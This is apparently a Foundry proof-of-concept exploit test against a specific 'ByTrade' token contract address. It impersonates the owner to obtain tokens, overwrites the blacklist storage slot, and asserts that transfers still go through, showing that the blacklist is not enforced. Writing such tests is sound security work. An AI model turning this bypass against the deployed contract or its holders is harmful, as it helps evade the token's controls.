// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IByTradeToken {
    function blacklist(address account) external view returns (bool);
    function paused() external view returns (bool);
}

interface IOwnable {
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe8bd1CA97F8a0582335407B40B0576Df641fA94C;
    address attacker = address(this);

    IERC20 token;
    IByTradeToken byTrade;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IERC20(TARGET);
        byTrade = IByTradeToken(TARGET);

        // Get owner and impersonate to get tokens
        address owner = IOwnable(TARGET).owner();
        vm.startPrank(owner);
        token.transfer(address(this), 1000 * 1e18);
        vm.stopPrank();

        // Verify we have tokens
        assertGt(token.balanceOf(address(this)), 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Calculate the storage slot for blacklist[address(this)]
        // blacklist mapping is at slot 1 (after paused bool at slot 0)
        bytes32 blacklistSlot = keccak256(abi.encodePacked(address(this), uint256(1)));

        // Step 2: Use vm.store to set blacklist[address(this)] = true
        vm.store(TARGET, blacklistSlot, bytes32(uint256(1)));

        // Step 3: Verify blacklist is now set to true
        bool isBlacklisted = byTrade.blacklist(address(this));
        assertEq(isBlacklisted, true, "Blacklist should be set to true");

        // Step 4: Attempt transfer despite being blacklisted
        uint256 balanceBefore = token.balanceOf(address(0xdead));
        token.transfer(address(0xdead), 100 * 1e18);
        uint256 balanceAfter = token.balanceOf(address(0xdead));

        // Step 5: Verify transfer succeeded (blacklist was NOT enforced)
        assertGt(balanceAfter, balanceBefore, "Transfer should succeed despite blacklist");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

